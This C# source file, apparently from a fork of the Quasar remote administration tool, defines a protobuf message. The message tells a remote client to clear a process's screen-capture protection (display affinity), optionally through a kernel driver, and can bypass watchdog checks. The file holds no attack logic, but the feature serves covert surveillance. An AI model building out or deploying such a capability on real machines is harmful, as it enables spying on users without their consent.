using ProtoBuf;
using Quasar.Common.Enums;

namespace Quasar.Common.Messages
{
    /// <summary>
    /// Requests that the client clears display affinity for the given process and, optionally, prepares the kernel driver.
    /// </summary>
    [ProtoContract]
    public class DoKernelUnblock : IMessage
    {
        /// <summary>
        /// The name of the process (without extension) that should be unblocked.
        /// </summary>
        [ProtoMember(1)]
        public string ProcessName { get; set; }

        /// <summary>
        /// Indicates if child processes spawned by the target should also be considered.
        /// </summary>
        [ProtoMember(2)]
        public bool IncludeChildProcesses { get; set; }

        /// <summary>
        /// When true, the server expects the kernel driver to be running before unblocking.
        /// </summary>
        [ProtoMember(3)]
        public bool RequireDriver { get; set; }

        /// <summary>
        /// Forces SetWindowDisplayAffinity even if windows already report WDA_NONE.
        /// </summary>
        [ProtoMember(4)]
        public bool ForceResetAffinity { get; set; }

        /// <summary>
        /// The driver state the server expects prior to running the command.
        /// </summary>
        [ProtoMember(5)]
        public KernelDriverState ExpectedDriverState { get; set; } = KernelDriverState.Unknown;

        /// <summary>
        /// Optional action to take regarding the driver before running the unblock.
        /// </summary>
        [ProtoMember(6)]
        public KernelDriverAction DriverAction { get; set; } = KernelDriverAction.QueryStatus;

        /// <summary>
        /// Allows bypassing sanity checks (e.g., watchdog failures) if necessary.
        /// </summary>
        [ProtoMember(7)]
        public bool Force { get; set; }
    }
}
